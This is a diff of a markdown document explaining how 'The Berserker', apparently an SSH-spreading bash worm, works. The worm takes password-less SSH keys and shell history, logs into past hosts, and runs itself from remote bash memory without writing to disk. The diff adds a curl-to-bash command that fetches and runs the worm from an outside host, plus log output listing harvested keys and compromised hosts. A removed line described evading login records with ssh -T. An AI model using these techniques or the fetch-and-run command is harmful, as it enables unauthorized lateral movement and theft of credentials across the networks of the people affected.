@@ -11,7 +11,7 @@ Random notes on how [The Berserker](../) works.
 [The Berserker](../) is a bash script. At this point the reader either has a heart attack or multiple orgasms. There is no in-between.
 
 ### General
-The Berserker looks for any password-less private ssh-key in ```~/.ssh``` and then gathers information from the User's shell history (```~/.bash_history```, ```.zsh_history``` and ```~/.history```) about any host the User connected to in the past. The Berserker then attempts to log into each host and injects itself into the remote's bash memory. It executes itself on the remote host and continues do do its deeds.
+The Berserker looks for any password-less private ssh-key in ```~/.ssh``` and then gathers information from the User's shell history (```~/.bash_history```, ```.zsh_history``` and ```~/.history```) about any host the User connected to in the past. The Berserker then attempts to log into each host and injects itself into the remote's bash memory. It executes itself on the remote host and continues to do its deeds.
 
 It keeps doing so until all ssh keys have been used and all hosts have been visited.
 
@@ -30,7 +30,7 @@ cat >e.sh<<__EOF__
 echo "Hello '\$USER'"
 __EOF__
 S="$(cat e.sh | sed 's/\x27/\x27"\x27"\x27/g')"
-ssh -Tn user@host.com "export SCRIPT='$S'; bash -c \"\$SCRIPT\""
+ssh user@host.com "export SCRIPT='$S'; bash -c \"\$SCRIPT\""
 ```
 
 1. Create a bash script named ```e.sh```.
@@ -39,11 +39,11 @@ ssh -Tn user@host.com "export SCRIPT='$S'; bash -c \"\$SCRIPT\""
 
 1. I use the hex notation (```\x27```) of ```'``` here or otherwise it would look rather complicated (```sed``` needs the ```'``` escaped so it is double-escaping time): ```S="$(cat e.sh | sed 's/'"'"'/'"'"'"'"'"'"'"'"'/g')"```. Most readers would commit suicide at this point. This is just to escape ```'``` correctly so that it can be passed to ```ssh``` as a command via a variable (```SCRIPT='$S'```) without interfering with the ```'``` around the ```$S```.
 
-1. The ```ssh``` parameter ```-T``` stops the host from allocating a PTY but also stops the session from showing up in ```who``` and ```lastlog```. 
-
 1. The long string ```export SCRIPT='$S'; bash -c \"\$SCRIPT\"``` is passed as a command to ```ssh``` to execute on the remote host. Note that the ```$``` in ```\"\$SCRIPT\"``` is escaped to prevent the local shell from substituting the variable. We like the remote bash (not the local one) to substitute ```$SCRIPT```. This is only needed because The Berserker needs to access the source of its own script (now stored in ```$SCRIPT``` to spread to further hosts). Otherwise ```bash -c '$S'``` would work.
 
 No data is written to the target's host hard drive. All is kept in memory.
+
+SSH has a 128k limit for passing arguments. *That ought to be enough for everyone*. Otherwise have a look how this limitation is overcome in [ssh-it's hook.sh](https://github.com/hackerschoice/ssh-it/blob/main/src/hook.sh) (pipeing a script with ```dd``` into a remote bash variable and executing the string from memory is a thing....).
 
 ### Bash Command line parsing
 
@@ -105,9 +105,33 @@ echo "Output ret=$ret err=$err"
 
 The output is ```Output ret=123 err=Hello-STDERR```.
 
+### Transport Protocol via STDIN/STDOUT
+
+All the slaves need to report back their findings to ```Earth``` (the *origin*). A simple protocol is used to pass the information from the farthest ```ssh``` back to the *origin* (via a long chain ssh-stdin-chain). In our example from above ```Pluto``` would pass the message back to ```Uranus```, ```Uranus``` back to ```Jupitor```, ... to ```Mars```, ... to ```Earth```. All protocol messages are then dispatched at the *origin* in ```msg_dispatch()```. The protocol messages are rather simple and you can see them by forcing the *origin* to be a slave with ```BS_DEBUG_IS_SLAVE=1```:
+
+```shell
+export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "BS_DEBUG_IS_SLAVE=1 $BS"
+```
+
+The output will look similar to this:
+```
+|I|0|76672d|[#1] ~/.ssh/id_rsa
+|I|0|76672d|[#2] ~/.ssh/id_rsa-old
+|T|0|76672d|admin@192.168.1.1|1/112
+|O|0|76672d|
+|L|1|437048|76672d|admin|ubnt
+|C|0|76672d|~/.ssh/id_rsa
+|T|0|76672d|pi@192.168.1.18|3/112
+|O|0|76672d|
+|L|1|39a307|76672d|pi|raspberrypi
+|I|1|39a307|Found 1 hosts to try.
+|I|1|39a307|Found 1 key without password.
+|I|1|39a307|[#1] ~/.ssh/id_rsa
+```
+
 ### If you are reading this...
 
-If you made it all the way to here then you are the type of person we like to speak to more. Join us on [Telegram](https://t.me/thcorg).
+If you made it all the way to here then you are the type of person we like to hang out with. Join us on [Telegram](https://t.me/thcorg).
 
 ### Contact
 
